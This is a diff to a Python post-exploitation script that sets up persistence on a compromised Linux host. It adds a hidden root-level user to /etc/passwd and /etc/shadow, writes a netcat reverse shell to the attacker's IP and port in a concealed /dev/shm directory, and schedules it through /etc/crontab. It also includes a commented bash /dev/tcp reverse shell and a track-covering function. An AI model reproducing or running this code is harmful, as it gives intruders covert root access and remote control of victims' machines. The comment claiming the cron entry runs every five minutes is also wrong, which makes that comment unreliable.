@@ -8,6 +8,7 @@
 
 import os
 import argparse
+import crypt
 
 
 parser = argparse.ArgumentParser(description="script for adding new root user and creating callback to local machine\nusage: pers.py -u 'pepe' -p 'password' 10.0.0.1 4444")
@@ -60,12 +61,9 @@ is_root = perm_check()
 def add_user(username,password):
 	if username:
 		print("establishing persistence...")
-		os.system("openssl passwd -6 {} > /tmp/.backups/passwd.txt".format(password))
-		f = open("/tmp/.backups/passwd.txt", "r")
-		new_user_pass = f.read().strip()
+		new_user_pass = crypt.crypt('{}'.format(password),'$6${}'.format(password))
 		os.system("echo '{}:{}:19448:0:99999:7:::' >> /etc/shadow".format(username,new_user_pass))
-		f.close()
-		os.system("echo '{}:x:0:0:{}:/root:/bin/bash' >> /etc/passwd".format(username,username))
+		os.system("echo '{}:x:0:0:{}:/{}:/bin/bash' >> /etc/passwd".format(username,username,username))
 		print("user {} added".format(username))
 	else:
 		print("\n*** error: username not specified: use -u to specify username ***")
@@ -74,28 +72,26 @@ def add_user(username,password):
 
 # create script for nc rev shell callback
 def callback(local_ip, local_port, username, password):
-	try:
-		print("\n### creating callback script for {}:{} ###".format(local_ip,local_port))
-		os.system("mkdir /dev/shm/.data")
-		os.system("touch /dev/shm/.data/data-log.sh")
-		os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
-		os.system("chown {} /dev/shm/.data/".format(username))
-		os.system("echo {} | sudo su {}".format(password,username))
-		os.system("chmod 100 /dev/shm/.data/data-log.sh")
-		os.system("chmod 700 /dev/shm/.data/")
-		print("\n### callback placed at /dev/shm/.data/data-log.sh ###")
-		#os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
-	except:
-		print("\n*** error: couldn't create callback script. netcat might not exist on machine, uncomment two lines above for bash rev shell ***")
+	print("\n### creating callback script for {}:{} ###".format(local_ip,local_port))
+	os.system("mkdir /dev/shm/.data")
+	os.system("touch /dev/shm/.data/data-log.sh")
+	os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
+	print("\n### enter {}'s password below: ###".format(username))
+	os.system("timeout -k 3 3 passwd {}".format(username))
+	os.system("chown {} /dev/shm/.data/".format(username))
+	os.system("echo '{}' | sudo su {}".format(password,username))
+	os.system("chmod 100 /dev/shm/.data/data-log.sh")
+	os.system("chmod 700 /dev/shm/.data/")
+	print("\n### callback placed at /dev/shm/.data/data-log.sh ###")
+	#os.system("echo 'bash -i >& /dev/tcp/{}/{} 0>&1' > /dev/shm/.data/data-log.sh".format(local_ip,local_port))
+
 
 # create cronjob for executing callback script every 5 min
 def cron_make():
-	try:
-		print("\n### creating cronjob to execute callback every 5 min... ###")
-		os.system("echo '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' >> /etc/crontab")
-		print("\n### cronjob created ###")
-	except:
-		print("\n*** error: couldn't create cronjob, try manually making one with '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' ***")
+	print("\n### creating cronjob to execute callback every 5 min... ###\n---cronjob: '5 * * * * /bin/bash /dev/shm/.data/data-log.sh'---")
+	os.system("echo '5 * * * * /bin/bash /dev/shm/.data/data-log.sh' >> /etc/crontab")
+	print("\n### cronjob created ###")
+
 
 # cover tracks and reestablish history logging
 def clear_tracks():
